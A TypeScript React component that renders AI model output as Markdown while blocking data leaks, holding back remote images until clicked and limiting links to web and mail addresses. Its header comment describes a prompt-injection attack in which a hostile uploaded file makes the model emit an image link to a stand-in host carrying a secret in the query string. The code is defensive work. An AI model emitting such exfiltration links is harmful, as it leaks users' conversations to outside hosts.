"use client";

import { isValidElement, useState, type ReactNode } from "react";
import ReactMarkdown, { defaultUrlTransform, type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { Check, Copy, ImageIcon } from "lucide-react";

/**
 * Markdown renderer for model output.
 *
 * Answers are generated from untrusted text (uploaded documents, imported repos), so a hostile file can
 * try to make the model emit a Markdown image such as ![x](https://evil.example/?q=<secret>): if the browser
 * fetched it automatically, the conversation would leak. Therefore:
 *   - remote images are NEVER fetched automatically. The answer shows where the image comes from, and it
 *     loads only when you click "Load image" (with a warning when the address carries query data);
 *   - small inline images (data:) need no network request, so they display directly;
 *   - links open only if they are http(s) or mailto, in a new tab with no referrer.
 */

function textOf(node: ReactNode): string {
  if (typeof node === "string" || typeof node === "number") return String(node);
  if (Array.isArray(node)) return node.map(textOf).join("");
  if (isValidElement<{ children?: ReactNode }>(node)) return textOf(node.props.children);
  return "";
}

function CodeBlock({ children }: { children?: ReactNode }) {
  const [copied, setCopied] = useState(false);
  const code = textOf(children).replace(/\n$/, "");
  const language = isValidElement<{ className?: string }>(children)
    ? /language-([\w+#-]+)/.exec(children.props.className ?? "")?.[1]
    : undefined;

  const copy = async () => {
    try {
      await navigator.clipboard.writeText(code);
      setCopied(true);
      setTimeout(() => setCopied(false), 1800);
    } catch {
      // clipboard unavailable (insecure context); nothing useful to do
    }
  };

  return (
    <div className="not-prose my-3 overflow-hidden rounded-lg border bg-muted/40">
      <div className="flex items-center justify-between border-b bg-muted/60 px-3 py-1 text-xs text-muted-foreground">
        <span>{language ?? "code"}</span>
        <button
          type="button"
          onClick={copy}
          className="flex items-center gap-1 rounded px-1.5 py-0.5 transition-colors hover:text-foreground"
          aria-label="Copy code"
        >
          {copied ? <Check className="size-3 text-emerald-500" /> : <Copy className="size-3" />}
          {copied ? "Copied" : "Copy"}
        </button>
      </div>
      <pre className="overflow-x-auto p-3 text-xs leading-relaxed">{children}</pre>
    </div>
  );
}

const SAFE_LINK = /^(https?:|mailto:)/i;
const INLINE_IMAGE = /^data:image\/(png|jpe?g|gif|webp);base64,/i;   // no SVG: it can carry script

function RemoteImage({ src, alt }: { src: string; alt?: string }) {
  const [loaded, setLoaded] = useState(false);

  if (INLINE_IMAGE.test(src)) {
    // eslint-disable-next-line @next/next/no-img-element
    return <img src={src} alt={alt ?? ""} className="my-2 max-h-96 max-w-full rounded-lg border" />;
  }

  let url: URL | null = null;
  try {
    url = new URL(src);
  } catch {
    // not a valid absolute URL
  }
  if (!url || !/^https?:$/.test(url.protocol)) {
    return <span className="text-xs italic text-muted-foreground">[image not shown{alt ? `: ${alt}` : ""}]</span>;
  }

  if (loaded) {
    return (
      // eslint-disable-next-line @next/next/no-img-element
      <img
        src={src}
        alt={alt ?? ""}
        referrerPolicy="no-referrer"
        loading="lazy"
        className="my-2 max-h-96 max-w-full rounded-lg border"
      />
    );
  }

  const carriesData = url.search.length > 1;
  return (
    <span className="not-prose my-2 flex flex-col gap-1.5 rounded-lg border border-dashed bg-muted/30 p-3 text-xs">
      <span className="flex items-center gap-2 font-medium">
        <ImageIcon className="size-4 shrink-0 text-muted-foreground" />
        <span className="truncate">{alt || "Image"}</span>
      </span>
      <span className="break-all text-muted-foreground">
        From <strong className="text-foreground">{url.host}</strong>
        {url.pathname !== "/" ? url.pathname : ""}
      </span>
      {carriesData && (
        <span className="text-amber-600 dark:text-amber-400">
          This address carries extra data after the &quot;?&quot;. Loading it sends that data to {url.host}. Only load
          images you trust.
        </span>
      )}
      <button
        type="button"
        onClick={() => setLoaded(true)}
        className="w-fit rounded-md border bg-background px-2.5 py-1 font-medium transition-colors hover:bg-muted"
      >
        Load image
      </button>
    </span>
  );
}

const components: Components = {
  img: ({ src, alt }) => (typeof src === "string" && src ? <RemoteImage src={src} alt={alt} /> : null),
  a: ({ href, children }) =>
    href && SAFE_LINK.test(href) ? (
      <a
        href={href}
        target="_blank"
        rel="noopener noreferrer nofollow"
        referrerPolicy="no-referrer"
        title={href}
        className="text-primary underline underline-offset-2"
      >
        {children}
      </a>
    ) : (
      <span>{children}</span>
    ),
  pre: ({ children }) => <CodeBlock>{children}</CodeBlock>,
};

// react-markdown strips data: URLs by default; allow only the small raster images RemoteImage accepts
const urlTransform = (url: string, key: string) =>
  key === "src" && INLINE_IMAGE.test(url) ? url : defaultUrlTransform(url);

export function SafeMarkdown({ children }: { children: string }) {
  return (
    <ReactMarkdown remarkPlugins={[remarkGfm]} components={components} urlTransform={urlTransform}>
      {children}
    </ReactMarkdown>
  );
}
